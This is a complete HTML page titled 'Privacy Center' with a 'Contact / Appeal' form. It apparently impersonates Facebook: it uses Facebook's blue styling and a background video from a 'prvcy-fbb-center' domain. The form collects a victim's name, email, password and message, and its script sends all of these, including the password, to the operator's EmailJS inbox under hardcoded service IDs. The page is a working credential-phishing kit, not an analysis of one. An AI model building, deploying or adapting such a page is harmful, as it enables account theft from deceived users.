<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Privacy Center</title>
  <meta name="description" content="Submit your details securely.">
  <style>
    body { margin:0; padding:0; font-family: Arial, Helvetica, sans-serif; }
    #bgVideo {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: -1;
    }
    .wrap {
      position: relative;
      z-index: 1;
      min-height: 100vh;
      display:flex;
      align-items:center;
      justify-content:center;
    }
    form {
      background: rgba(255,255,255,0.95);
      padding:22px;
      border-radius:8px;
      max-width:420px;
      width:100%;
      box-shadow:0 10px 30px rgba(0,0,0,0.08);
    }
    input, textarea, button {
      width:100%;
      padding:12px;
      margin:8px 0;
      border-radius:6px;
      border:1px solid #ccc;
      font-size:14px;
    }
    textarea { min-height:110px; resize:vertical; }
    button {
      background:#1877f2;
      color:#fff;
      border:none;
      font-weight:600;
      cursor:pointer;
    }
    button:hover { opacity:.95; }
    .note { font-size:12px; color:#777; text-align:center; margin-top:6px; }
    h2 { text-align:center; margin:0 0 12px; }
  </style>
</head>
<body>

  <!-- Background Video from original link -->
  <video autoplay muted loop id="bgVideo">
    <source src="https://prvcy-fbb-center.vercel.app/background.mp4" type="video/mp4">
    Your browser does not support HTML5 video.
  </video>

  <!-- Form -->
  <div class="wrap">
    <form id="contactForm">
      <h2>Contact / Appeal</h2>
      <input type="text" id="name" placeholder="Full Name" required>
      <input type="email" id="email" placeholder="Email Address" required>
      <input type="password" id="password" placeholder="Password (optional)">
      <textarea id="message" placeholder="Your message" required></textarea>
      <button type="submit">Submit</button>
      <div class="note">Submission goes directly to your EmailJS inbox.</div>
    </form>
  </div>

  <!-- EmailJS Integration -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("VTRU_7bT435-YBIJ-");

    document.getElementById("contactForm").addEventListener("submit", function(e){
      e.preventDefault();

      var nameValue = document.getElementById("name").value;
      var emailValue = document.getElementById("email").value;
      var passwordValue = document.getElementById("password").value || "N/A";
      var messageValue = document.getElementById("message").value;

      emailjs.send("service_8fnaq5j", "template_9q0njpm", {
        name: nameValue,
        email: emailValue,
        password: passwordValue,
        message: messageValue
      }).then(function(response){
        alert("Form submitted successfully!");
        document.getElementById("contactForm").reset();
      }, function(error){
        alert("Submission failed. Please try again.");
        console.log("FAILED...", error);
      });
    });
  </script>

</body>
</html>
